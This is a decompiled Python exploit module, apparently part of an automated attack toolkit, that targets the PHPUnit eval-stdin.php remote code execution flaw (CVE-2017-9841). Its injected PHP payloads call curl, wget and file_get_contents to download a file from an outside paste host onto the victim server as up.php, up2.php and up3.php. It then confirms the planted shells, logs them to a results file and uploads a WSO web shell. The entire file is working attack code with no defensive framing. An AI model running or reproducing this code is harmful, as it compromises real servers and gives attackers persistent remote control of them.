# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2017_9841PHPUnit.py
import requests
from Exploits import printModule
from Tools import wsoShellUploaderModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'

def Exploit(url, Vulnurl, Vname, CMS):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'
       }
    payload = Vulnurl
    PostData1 = '<?php system("curl -O https://hastebin.com/raw/kojoralohu"); system("mv kojoralohu up.php"); ?>'
    PostData2 = '<?php system("wget https://hastebin.com/raw/kojoralohu -O up2.php"); ?>'
    PostData3 = '<?php fwrite(fopen("up3.php","w+"),file_get_contents("https://hastebin.com/raw/kojoralohu")); ?>'
    vulnurl = url + payload
    shell1 = str(vulnurl).replace('eval-stdin.php', 'up.php')
    shell2 = str(vulnurl).replace('eval-stdin.php', 'up2.php')
    shell3 = str(vulnurl).replace('eval-stdin.php', 'up3.php')
    try:
        session = requests.session()
        session.get('http://' + vulnurl, data=PostData1, headers=headers, timeout=10, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData2, headers=headers, timeout=10, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData3, headers=headers, timeout=10, verify=False, allow_redirects=False)
        CheckShell1 = requests.get('http://' + shell1, headers=headers, timeout=10)
        CheckShell2 = requests.get('http://' + shell2, headers=headers, timeout=10)
        CheckShell3 = requests.get('http://' + shell3, headers=headers, timeout=10)
        if 'Vuln!!' in str(CheckShell1.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell1))
            wsoShellUploaderModule.UploadWso2(shell1)
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        if 'Vuln!!' in str(CheckShell2.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell2))
            wsoShellUploaderModule.UploadWso2(shell2)
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        if 'Vuln!!' in str(CheckShell3.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell3))
            wsoShellUploaderModule.UploadWso2(shell3)
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        return printModule.returnNo(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
    except:
        return printModule.returnNo(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)